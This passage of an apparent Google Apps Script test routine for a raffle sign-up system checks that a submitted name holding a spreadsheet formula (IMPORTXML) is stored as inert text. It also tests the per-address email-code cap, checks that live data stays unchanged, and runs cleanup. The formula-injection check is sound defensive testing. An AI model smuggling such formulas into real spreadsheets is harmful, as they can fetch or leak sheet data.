    phone: '(215) 555-8106', consent: 'Yes' }, 'csv', '(215) 555-9106');
  check('an entry with a formula in the name is accepted (it is only text)', fRes.ok === true,
        JSON.stringify(fRes));
  // Find the row by NAME, not getLastRow(): a journey now ends with the
  // referral's own entry, so the last row belongs to somebody else.
  var fSheet = raffleSheet_(true);
  var fRow = 0;
  var fNames = fSheet.getRange(1, 2, fSheet.getLastRow(), 1).getValues();
  for (var fi = fNames.length - 1; fi >= 0; fi--) {
    if (String(fNames[fi][0]).indexOf('IMPORTXML') !== -1) { fRow = fi + 1; break; }
  }
  check('the formula-name row is findable', fRow > 0, 'no row carried the formula name');
  var nameCell = fSheet.getRange(fRow || fSheet.getLastRow(), 2);
  check('the formula cell holds NO formula',
        String(nameCell.getFormula() || '') === '',
        'LIVE FORMULA IN THE SHEET: ' + nameCell.getFormula());
  check('the formula cell still reads back as the text that was typed',
        String(nameCell.getValue()).indexOf('IMPORTXML') !== -1,
        'got ' + nameCell.getValue());
  check('raffleReadEntries_ sees the same name with no text marker',
        raffleReadEntries_(true).some(function (r) { return r.name.charAt(0) !== "'"; }));

  // The verification-email cap. The two entries above already consumed codes for
  // their own addresses; this hammers ONE address and expects it to be cut off.
  var capAddr = RAFFLE_QA_ADDRESS_BASE + stamp + '-cap' + RAFFLE_QA_DOMAIN;
  var capSent = 0, capRefused = 0;
  for (var ci = 0; ci < RAFFLE_CODE_MAX_PER_ADDRESS + 2; ci++) {
    var capRes = request({ fullName: 'QA Cap Tester ' + stamp, email: capAddr,
                           phone: '(215) 555-82' + (10 + ci), consent: 'Yes' });
    if (capRes.ok && capRes.needsCode) capSent++; else capRefused++;
  }
  check('one address cannot pull more than ' + RAFFLE_CODE_MAX_PER_ADDRESS + ' codes',
        capSent <= RAFFLE_CODE_MAX_PER_ADDRESS, 'sent ' + capSent);
  check('the over-cap requests were refused', capRefused > 0);

  // ---- 6. The live raffle must be untouched -------------------------------
  section('6. The LIVE raffle is untouched');
  check('live entries unchanged', raffleReadEntries_(false).length === liveBefore,
        'was ' + liveBefore + ', now ' + raffleReadEntries_(false).length);
  check('live winner property still unset', !props.getProperty(RAFFLE_WINNER_PROP),
        'A LIVE WINNER EXISTS — this is serious, tell Claude');
  check('the 6:15 trigger is still armed',
        ScriptApp.getProjectTriggers().filter(function (t) {
          return t.getHandlerFunction() === 'raffleScheduledDraw'; }).length === 1);

  // ---- 7. Cleanup ---------------------------------------------------------
  section('7. Cleanup');
  if (cleanUp) {
    raffleResetTest();
    check('test entries cleared', raffleReadEntries_(true).length === 0);
    check('test winner cleared', !props.getProperty(RAFFLE_TEST_WINNER_PROP));
    check('live entries STILL unchanged', raffleReadEntries_(false).length === liveBefore);
  } else {
    log.push('SKIPPED — test data left in place for inspection.');
    log.push('Run raffleResetTest() when you are done.');
  }

  log.push('', '================================',
           pass + ' passed, ' + fail + ' failed',
           '================================');
  log.push('', 'FUB CLEANUP: this run created real FUB contacts. Filter FUB on the tag',
           '"' + QA_TEST_TAG + '" and delete them.');
  log.push('Verification-code emails were sent to ' + RAFFLE_QA_ADDRESS_BASE + stamp +
           '-N' + RAFFLE_QA_DOMAIN + ' — they deliver to Durand.');

  var msg = log.join('\n');
  Logger.log(msg);
  return msg;
}
